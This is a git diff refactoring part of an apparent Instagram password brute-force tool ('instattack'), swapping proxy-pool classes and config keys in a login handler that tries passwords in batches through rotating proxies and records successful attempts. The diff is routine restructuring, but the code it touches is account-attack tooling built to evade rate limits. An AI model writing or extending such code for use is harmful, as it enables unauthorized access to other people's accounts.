@@ -8,10 +8,9 @@ from instattack.lib.utils import (
     limit_as_completed, start_and_stop, cancel_remaining_tasks)
 
 from instattack.app.exceptions import TokenNotFound, PoolNoProxyError
-from instattack.app.proxies import AdvancedProxyPool
+from instattack.app.proxies import SmartProxyManager, ManagedProxyPool
 
 from .base import AbstractRequestHandler
-from .proxies import BrokeredProxyHandler
 from .client import instagram_client
 
 
@@ -58,7 +57,7 @@ class AbstractLoginHandler(AbstractRequestHandler):
         have not been run yet.
         """
         while True:
-            proxy = await self.proxy_handler.pool.get()
+            proxy = await self.proxy_manager.get()
             if not proxy:
                 raise PoolNoProxyError()
 
@@ -84,7 +83,7 @@ class AbstractLoginHandler(AbstractRequestHandler):
 
         # Stop Event: Notifies limit_as_completed to stop creating additional tasks
         # so that we can cancel the leftover ones.
-        batch_size = config['attempts']['batch_size']
+        batch_size = config['login']['attempts']['attempts_batch_size']
 
         def stop_callback(fut, pending, num_tries):
             if fut.exception():
@@ -108,7 +107,7 @@ class AbstractLoginHandler(AbstractRequestHandler):
                 return result, num_tries
 
     async def handle_attempt(self, result):
-        if config['attempts']['save_method'] == 'live':
+        if config['login']['attempts']['save_method'] == 'live':
             task = self.user.create_or_update_attempt(
                 result.password,
                 success=result.authorized
@@ -127,7 +126,7 @@ class AbstractLoginHandler(AbstractRequestHandler):
         """
         await super(AbstractLoginHandler, self).finish()
 
-        if config['attempts']['save_method'] == 'end':
+        if config['login']['attempts']['save_method'] == 'end':
             with start_and_stop(f"Saving {len(self.attempts_to_save)} Attempts"):
                 tasks = [
                     self.user.create_or_update_attempt(att[0], success=att[1])
@@ -139,23 +138,23 @@ class AbstractLoginHandler(AbstractRequestHandler):
 class LoginHandler(AbstractLoginHandler):
 
     __name__ = 'Attack Handler'
-    __proxy_handler__ = BrokeredProxyHandler
-    __proxy_pool__ = AdvancedProxyPool
+    __proxy_manager__ = SmartProxyManager
+    __proxy_pool__ = ManagedProxyPool
 
     async def login(self, password):
         try:
             results = await asyncio.gather(
                 self._login(password),
-                self.proxy_handler.run(),
+                self.proxy_manager.start(),
             )
         except Exception as e:
             await self.finish()
-            await self.proxy_handler.stop()
+            await self.proxy_manager.stop()
             raise e
         else:
             # We might not need to stop proxy handler?
             await self.finish()
-            await self.proxy_handler.stop()
+            await self.proxy_manager.stop()
             return results[0]
 
     async def _login(self, password):
